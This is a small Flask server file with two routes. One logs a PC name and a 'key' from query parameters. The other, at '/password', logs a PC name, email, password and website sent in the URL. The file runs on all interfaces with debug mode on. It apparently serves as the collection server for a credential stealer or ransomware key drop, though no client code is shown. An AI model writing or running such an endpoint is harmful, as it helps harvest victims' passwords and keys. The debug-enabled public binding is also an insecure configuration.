from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route("/")
def index():
    print(request.args.get("pcname"), request.args.get("key"))
    return render_template("index.html")

@app.route("/password")
def passwords():
    pcName = request.args.get("pcname")
    email = request.args.get("email")
    password = request.args.get("password")
    website = request.args.get("website")

    print(pcName, email, password, website)
    

    return render_template("index.html")



app.run(host="0.0.0.0", port=8090, debug=True)
